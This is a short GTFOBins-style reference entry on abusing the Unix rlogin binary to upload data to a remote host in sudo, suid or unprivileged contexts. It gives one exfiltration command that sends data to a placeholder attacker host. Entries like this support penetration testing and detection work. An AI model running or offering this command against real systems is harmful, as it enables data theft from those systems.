---
type: gtfobin
name: rlogin
platform: Unix
functions: [upload]
tags: [gtfobin, unix, lotl]
---

# rlogin

## upload

```bash
rlogin -l DATA -p 12345 attacker.com
```
_The file is corrupted by leading and trailing spurious data._
**Contexts:** sudo, suid, unprivileged
